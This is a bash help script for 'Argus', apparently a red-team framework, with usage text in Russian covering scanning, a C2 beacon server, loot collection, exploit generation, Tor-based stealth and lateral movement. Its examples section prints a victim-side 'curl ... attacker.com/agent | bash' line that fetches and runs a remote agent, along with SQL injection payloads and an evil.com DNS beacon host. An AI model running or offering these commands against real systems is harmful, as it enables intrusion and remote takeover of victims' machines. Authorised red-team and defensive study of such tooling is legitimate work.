#!/bin/bash
# Argus Help System

case "${1:-main}" in
    scan)
        echo "ARGUS SCAN — Полное сканирование"
        echo ""
        echo "Использование:"
        echo "  argus scan [scope] <target>"
        echo "  SCOPE='*.target.com' argus scan http://target.com"
        echo ""
        echo "Этапы: OSINT → Nmap → Директории → SQLi → XSS → Инъекции → Nuclei → Отчёты"
        echo "Результаты: ~/argus_scan_*/ (HTML, PDF, JSON, CSV, XML)"
        ;;
    c2)
        echo "ARGUS C2 — Командный центр"
        echo ""
        echo "Использование:"
        echo "  argus c2 [port]            # HTTPS Beacon сервер"
        echo "  ~/argus_dns_beacon.sh ns1.evil.com  # DNS Beacon"
        echo ""
        echo "Агенты стучатся на сервер, получают команды через HTTPS/DNS"
        ;;
    passive)
        echo "ARGUS PASSIVE — Пассивный сканер"
        echo ""
        echo "Использование:"
        echo "  argus passive [port]       # Запуск на порту (по умолчанию 9990)"
        echo "  Настроить браузер: HTTP прокси 127.0.0.1:9990"
        echo ""
        echo "62 сигнатуры: SQLi, XSS, LFI, CORS, токены, CMS, JWT..."
        ;;
    loot)
        echo "ARGUS LOOT — Сбор добычи"
        echo ""
        echo "Использование:"
        echo "  argus loot                 # Собрать все находки в одну папку"
        echo "  ~/auto_loot.sh             # Авто-сбор после взлома"
        ;;
    poc)
        echo "ARGUS POC — Генератор эксплойтов"
        echo ""
        echo "Использование:"
        echo "  argus poc <тип> <url> <пейлоад>"
        echo "  argus poc SQLi 'http://target.com?id=' \"' OR '1'='1\""
        ;;
    stealth)
        echo "ARGUS STEALTH — Скрытный режим"
        echo ""
        echo "Использование:"
        echo "  argus stealth <target>     # Сканирование через Tor + обфускация"
        ;;
    examples)
        echo "ARGUS EXAMPLES — Примеры атак"
        echo ""
        echo "  # Быстрый скан"
        echo "  argus scan example.com"
        echo ""
        echo "  # Скрытный скан"
        echo "  argus stealth target.com"
        echo ""
        echo "  # Пассивный сбор"
        echo "  argus passive 8080"
        echo "  # Браузер: HTTP прокси 127.0.0.1:8080"
        echo ""
        echo "  # C2 с HTTPS"
        echo "  argus c2 443"
        echo "  # Жертва: curl -k https://attacker.com/agent | bash"
        echo ""
        echo "  # Эксплойт для отчёта"
        echo "  argus poc SQLi 'http://target.com?id=' \"1' OR '1'='1\""
        echo "  argus cvss N H"
        ;;
    *)
        echo "ARGUS v48.0 — Red Team Framework"
        echo ""
        echo "Команды:"
        echo "  scan      — Полное сканирование"
        echo "  passive   — Пассивный сканер (62 сигнатуры)"
        echo "  c2        — C2 сервер (HTTPS + DNS Beacon)"
        echo "  loot      — Собрать добычу"
        echo "  poc       — Сгенерировать PoC"
        echo "  cvss      — CVSS 4.0 калькулятор"
        echo "  stealth   — Скрытный режим (Tor + обфускация)"
        echo "  escalate  — Эскалация привилегий"
        echo "  spread    — Lateral Movement"
        echo "  console   — Интерактивная консоль"
        echo "  status    — Статус компонентов"
        echo "  update    — Обновление"
        echo "  help      — Эта справка"
        echo ""
        echo "Подробнее: argus help scan | c2 | passive | examples"
        ;;
esac
